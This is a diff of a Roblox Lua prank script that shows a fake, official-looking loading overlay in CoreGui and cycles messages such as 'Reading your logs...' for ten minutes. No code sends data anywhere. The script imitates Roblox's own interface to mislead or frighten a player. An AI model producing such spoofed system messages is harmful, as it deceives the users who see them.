@@ -1,26 +1,33 @@
--- Fake Loading Screen v1.0
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "Loading"
-ScreenGui.ResetOnSpawn = false
-ScreenGui.Parent = game.CoreGui
+-- Official Style Fake Loading Screen v2 (10-Minute Display)
 
-local Frame = Instance.new("Frame")
-Frame.Size = UDim2.new(0.4, 0, 0.2, 0)
-Frame.Position = UDim2.new(0.3, 0, 0.4, 0)
-Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-Frame.BorderSizePixel = 0
-Frame.BackgroundTransparency = 0.1
-Frame.Parent = ScreenGui
+local gui = Instance.new("ScreenGui")
+gui.Name = "RobloxAdvanceLoading"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.Parent = game:GetService("CoreGui")
 
-local TextLabel = Instance.new("TextLabel")
-TextLabel.Size = UDim2.new(1, 0, 1, 0)
-TextLabel.Position = UDim2.new(0, 0, 0, 0)
-TextLabel.BackgroundTransparency = 1
-TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel.Font = Enum.Font.GothamBold
-TextLabel.TextSize = 24
-TextLabel.Text = "Please wait..."
-TextLabel.Parent = Frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0.35, 0, 0.15, 0)
+frame.Position = UDim2.new(0.325, 0, 0.425, 0)
+frame.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+frame.BorderSizePixel = 0
+frame.BackgroundTransparency = 0.05
+frame.Parent = gui
+
+local uicorner = Instance.new("UICorner")
+uicorner.CornerRadius = UDim.new(0, 8)
+uicorner.Parent = frame
+
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(1, -20, 1, -20)
+label.Position = UDim2.new(0, 10, 0, 10)
+label.BackgroundTransparency = 1
+label.TextColor3 = Color3.fromRGB(255, 255, 255)
+label.Font = Enum.Font.SourceSansSemibold
+label.TextScaled = true
+label.TextWrapped = true
+label.Text = "Loading..."
+label.Parent = frame
 
 local messages = {
     "Please wait...",
@@ -30,9 +37,16 @@ local messages = {
     "Reading your logs..."
 }
 
-for _, msg in ipairs(messages) do
-    TextLabel.Text = msg
+-- Loop messages for 10 minutes (600 seconds)
+local startTime = tick()
+local msgIndex = 1
+local totalTime = 600  -- 10 minutes
+
+while tick() - startTime < totalTime do
+    label.Text = messages[msgIndex]
+    msgIndex = msgIndex % #messages + 1
     wait(2)
 end
 
-ScreenGui:Destroy()
+-- Clean up after time ends
+gui:Destroy()
